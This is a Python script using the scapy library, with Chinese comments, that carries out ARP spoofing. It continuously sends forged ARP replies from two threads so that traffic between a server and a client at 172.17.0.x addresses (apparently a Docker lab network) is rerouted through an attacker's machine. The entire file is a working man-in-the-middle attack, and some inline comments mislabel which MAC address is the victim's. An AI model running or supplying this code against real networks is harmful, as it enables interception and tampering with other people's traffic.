"""
实施arp欺骗
"""

from scapy.all import *
import threading


def arp_spoof(hwdst: str, pdst: str, hwsrc: str, psrc: str, inter: int = 0.1) -> None:
    """发送arp应答报文"""
    eth = Ether()
    arp = ARP(
        op='is-at', # arp应答报文

        hwsrc=hwsrc, # 源mac地址, 应为受害者mac
        psrc=psrc, # 源ip, 应为受害者ip

        hwdst=hwdst, # 目的mac, 应为中间人mac
        pdst=pdst # 目的ip, 应为受害者想要通信的对方的ip
    )

    pkt = eth/arp

    sendp(pkt, iface='eth0', loop=1, inter=inter) # 指定网卡为eth0, 开启循环发包, 每inter秒发送一次


ATTACKER_MAC = '02:42:ac:11:00:02'
ATTACKER_IP = '172.17.0.2'

GATEWAY_IP = '172.17.0.1'

SERVER_MAC = '02:42:ac:11:00:03'
SERVER_IP = '172.17.0.3'

CLIENT_MAC = '02:42:ac:11:00:04'
CLIENT_IP = '172.17.0.4'

# 服务端的arp欺骗, 采用多线程模式
server_arp_spoof_thread = threading.Thread(
    target=arp_spoof,
    args=(
        SERVER_MAC,
        SERVER_IP,
        ATTACKER_MAC,
        CLIENT_IP,
        0.1
    )
)

# 客户端的arp欺骗, 采用多线程模式
client_arp_spoof_thread = threading.Thread(
    target=arp_spoof,
    args=(
        CLIENT_MAC,
        CLIENT_IP,
        ATTACKER_MAC,
        SERVER_IP,
        0.1
    )
)

# 线程启动
server_arp_spoof_thread.start()
client_arp_spoof_thread.start()
